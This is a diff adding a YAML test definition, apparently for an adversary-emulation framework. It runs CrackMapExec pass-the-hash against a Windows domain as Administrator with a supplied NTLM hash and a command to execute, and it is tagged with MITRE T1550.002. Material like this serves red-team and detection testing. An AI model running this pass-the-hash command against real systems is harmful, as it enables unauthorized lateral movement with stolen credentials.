@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: crackmapexec Pass the Hash
+description: |
+    command execute with crackmapexec
+args:
+    - name: user_name
+      type: string
+      default: Administrator
+    - name: crackmapexec_exe
+      type: path
+      default: C:\CrackMapExecWin\crackmapexec.exe
+    - name: command
+      type: string
+      default: whoami
+    - name: ntlm
+      type: string
+      default: cc36cf7a8514893efccd3324464tkg1a
+    - name: domain
+      type: string
+      default: '%userdnsdomain%'
+uuid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1550: Use Alternate Authentication Material'
+    subtechniques:
+        - 'T1550.002: Pass the Hash'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: crackmapexec-pass-the-hash
+      inline: |
+        {{.Args.crackmapexec_exe}} {{.Args.domain}} -u {{.Args.user_name}} -H {{.Args.ntlm}} -x {{.Args.command}}
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
